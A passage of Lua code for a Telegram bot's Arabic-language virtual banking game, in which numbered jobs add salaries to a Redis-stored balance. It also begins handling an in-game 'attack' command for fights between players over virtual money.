local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3000 دولار 💰\nوظيفتك : كابتن كريم 🚙\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "2" then
local ratpep = ballancee + 3500
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3500 دولار 💰\nوظيفتك : شرطي 👮🏻‍♂️\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "3" then
local ratpep = ballancee + 3500
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3500 دولار 💰\nوظيفتك : بياع حبوب 🍻\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "4" then
local ratpep = ballancee + 3000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3000 دولار 💰\nوظيفتك : سواق تاكسي 🚕\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "5" then
local ratpep = ballancee + 5000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 5000 دولار 💰\nوظيفتك : قاضي 👨\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "6" then
local ratpep = ballancee + 2500
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 2500 دولار 💰\nوظيفتك : نوم 🛌\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "7" then
local ratpep = ballancee + 2700
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 2700 دولار 💰\nوظيفتك : مغني 🎤\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "8" then
local ratpep = ballancee + 2900
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 2900 دولار 💰\nوظيفتك : كوفيره 💆\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "9" then
local ratpep = ballancee + 2500
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 2500 دولار 💰\nوظيفتك : ربة منزل 🤷\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "10" then
local ratpep = ballancee + 2900
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 2900 دولار 💰\nوظيفتك : مربيه اطفال 💁\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "11" then
local ratpep = ballancee + 3700
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3700 دولار 💰\nوظيفتك : كهربائي 💡\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "12" then
local ratpep = ballancee + 3600
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3600 دولار 💰\nوظيفتك : نجار ⛏\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "13" then
local ratpep = ballancee + 2400
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 2400 دولار 💰\nوظيفتك : متذوق طعام 🍕\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "14" then
local ratpep = ballancee + 3000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3000 دولار 💰\nوظيفتك : فلاح 👨\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "15" then
local ratpep = ballancee + 5000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 5000 دولار 💰\nوظيفتك : كاشير بنده 🙋\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "16" then
local ratpep = ballancee + 6000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 6000 دولار 💰\nوظيفتك : ممرض 👨\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "17" then
local ratpep = ballancee + 3100
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3100 دولار 💰\nوظيفتك : مهرج 🤹\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "18" then
local ratpep = ballancee + 3300
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3300 دولار 💰\nوظيفتك : عامل توصيل 🚴\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "19" then
local ratpep = ballancee + 4800
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 4800 دولار 💰\nوظيفتك : عسكري 👮\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "20" then
local ratpep = ballancee + 6000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 6000 دولار 💰\nوظيفتك : مهندس 👨\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "21" then
local ratpep = ballancee + 8000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 8000 دولار 💰\nوظيفتك : وزير 👨\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "22" then
local ratpep = ballancee + 5500
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 5500 دولار 💰\nوظيفتك : محامي ⚖️\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "23" then
local ratpep = ballancee + 5500
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 5500 دولار 💰\nوظيفتك : تاجر 💰\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "24" then
local ratpep = ballancee + 7000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 7000 دولار 💰\nوظيفتك : دكتور 👨\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "25" then
local ratpep = ballancee + 2600
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 2600 دولار 💰\nوظيفتك : حفار قبور ⚓\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "26" then
local ratpep = ballancee + 3000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3000 دولار 💰\nوظيفتك : حلاق ✂\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "27" then
local ratpep = ballancee + 5000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 5000 دولار 💰\nوظيفتك : إمام مسجد 📿\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "28" then
local ratpep = ballancee + 3000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3000 دولار 💰\nوظيفتك : صياد 🎣\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "29" then
local ratpep = ballancee + 2300
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 2300 دولار 💰\nوظيفتك : خياط 🧵\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "30" then
local ratpep = ballancee + 7100
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 7100 دولار 💰\nوظيفتك : طيار 🛩\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "31" then
local ratpep = ballancee + 5300
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 5300 دولار 💰\nوظيفتك : مودل 🕴\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "32" then
local ratpep = ballancee + 10000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 10000 دولار 💰\nوظيفتك : ملك 👑\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "33" then
local ratpep = ballancee + 2700
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 2700 دولار 💰\nوظيفتك : سباك 🔧\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "34" then
local ratpep = ballancee + 3900
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3900 دولار 💰\nوظيفتك : موزع 🗺\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "35" then
local ratpep = ballancee + 4100
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 4100 دولار 💰\nوظيفتك : سكيورتي 👮\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "36" then
local ratpep = ballancee + 3500
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3500 دولار 💰\nوظيفتك : معلم شاورما 🌯\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "37" then
local ratpep = ballancee + 6700
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 6700 دولار 💰\nوظيفتك : دكتور ولاده 👨\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "38" then
local ratpep = ballancee + 6600
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 6600 دولار 💰\nوظيفتك : مذيع 🗣\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "39" then
local ratpep = ballancee + 3400
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3400 دولار 💰\nوظيفتك : عامل مساج 💆\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "40" then
local ratpep = ballancee + 6300
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 6300 دولار 💰\nوظيفتك : ممثل 🤵\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "41" then
local ratpep = ballancee + 3000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3000 دولار 💰\nوظيفتك : جزار 🥩\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "42" then
local ratpep = ballancee + 7000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 7000 دولار 💰\nوظيفتك : مدير بنك 💳\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "43" then
local ratpep = ballancee + 6000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 6000 دولار 💰\nوظيفتك : مبرمج 👨\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "44" then
local ratpep = ballancee + 5000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 5000 دولار 💰\nوظيفتك : رقاصه 💃\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "45" then
local ratpep = ballancee + 4900
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 4900 دولار 💰\nوظيفتك : 👩🏼‍💻 صحفي\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "46" then
local ratpep = ballancee + 5300
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 5300 دولار 💰\nوظيفتك : 🥷 حرامي\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "47" then
local ratpep = ballancee + 6000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 6000 دولار 💰\nوظيفتك : 🔮 ساحر\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "48" then
local ratpep = ballancee + 6500
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 6500 دولار 💰\nوظيفتك : ⚽ لاعب️\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "49" then
local ratpep = ballancee + 4000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 4000 دولار 💰\nوظيفتك : 🖼 مصور\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "50" then
local ratpep = ballancee + 3000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3000 دولار 💰\nوظيفتك : ☎️ عامل مقسم\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "51" then
local ratpep = ballancee + 3200
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 3200 دولار 💰\nوظيفتك : 📖 كاتب\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
elseif Descriptioont == "52" then
local ratpep = ballancee + 4000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id,"اشعار ايداع "..neews.."\nالمبلغ : 4000 دولار 💰\nوظيفتك : 🧪 مخبري\nنوع العملية : اضافة راتب\nرصيدك الآن : "..convert_mony.." دولار 💰","md",true)
Redis:setex("iiioo" .. msg.sender.user_id,600, true)
end
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'هجوم' then
LuaTele.sendText(msg.chat_id,msg.id, "استعمل الامر كذا :\n\n`هجوم` المبلغ ( بالرد )","md",true)
end
if text and text:match("^هجوم (%d+)$") and msg.reply_to_message_id == 0 then
LuaTele.sendText(msg.chat_id,msg.id, "استعمل الامر كذا :\n\n`هجوم` المبلغ ( بالرد )","md",true)
end

if text and text:match('^هجوم (.*)$') and tonumber(msg.reply_to_message_id) ~= 0 then
local UserName = text:match('^هجوم (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = coniss:gsub('-','')
local coniss = tonumber(coniss)
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) and tonumber(ballanceed) > 5000000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• عليك قرض بقيمة "..krses.." دولار 💰 \nقم بسداده بالامر `تسديد القرض` ","md",true)
end
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
if Redis:sismember("booob",msg.sender.user_id) then
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
LuaTele.sendText(msg.chat_id,msg.id,"\n*• لا يمتلك حساب بالبنك*","md",true)  
return false
end
if Remsg.sender.user_id == msg.sender.user_id then
LuaTele.sendText(msg.chat_id,msg.id,"\n*• تهاجم نفسك 🤡*","md",true)  
return false
end
if Redis:ttl("attack" .. msg.sender.user_id) >= 580 then
return LuaTele.sendText(msg.chat_id,msg.id,"• خسرت بأخر معركة استنى ( 10 دقائق )","md",true)
elseif Redis:ttl("attack" .. msg.sender.user_id) >= 540 then
return LuaTele.sendText(msg.chat_id,msg.id,"• خسرت بأخر معركة استنى ( 9 دقائق )","md",true)
elseif Redis:ttl("attack" .. msg.sender.user_id) >= 480 then
